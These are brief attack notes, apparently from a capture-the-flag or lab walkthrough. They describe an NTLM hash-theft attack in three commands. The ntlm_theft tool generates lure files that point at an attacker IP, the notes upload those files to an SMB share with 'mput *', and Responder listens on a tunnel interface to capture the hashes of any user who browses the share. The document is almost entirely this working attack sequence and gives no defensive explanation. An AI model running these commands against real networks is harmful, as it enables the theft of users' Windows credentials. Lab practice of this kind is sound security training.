https://github.com/Greenwolf/ntlm_theft
```
python ntlm_theft.py -g all -s 10.10.14.6 -f
```

Then connect to the SMB share within this directory and upload all files as:
```
mput *
```

Whilst having Responder on:

```
Responder -I tun1 
```
